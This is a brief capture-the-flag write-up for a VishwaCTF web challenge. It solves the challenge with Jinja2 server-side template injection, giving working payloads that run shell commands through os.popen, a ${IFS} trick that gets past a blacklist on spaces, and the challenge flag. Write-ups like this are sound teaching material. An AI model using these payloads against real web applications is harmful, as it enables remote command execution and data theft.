# Challenge description

Hey Buddy, Give me your name I will display your name on my website. Yes exactly, there is nothing in this website.

Url - https://h3y-buddy.vishwactf.com/

-----------------------------------------------------------

So this was a typical SSTI ctf challenge but later on we found that there was a blacklist for spaces.

Payload:

```` /submit?name={{config.__class__.__init__.__globals__[%27os%27].popen("ls").read()}}  ````

Output:

![image](https://user-images.githubusercontent.com/58823465/159277284-d883ed26-f4ab-45a8-a29d-9ce0cdd83644.png)


We can simply bypass this with ${IFS}:

Final payload:

```` /submit?name={{config.__class__.__init__.__globals__[%27os%27].popen("cat${IFS}flag.txt").read()}}  ````

Output:

![image](https://user-images.githubusercontent.com/58823465/159277454-bc977a5e-0249-4c27-b968-82bf46f1e719.png)


And there's the flag

``` Flag :  VishwaCTF{S3rv3r_1s_4fraiD_of_inj3c7ion} ```
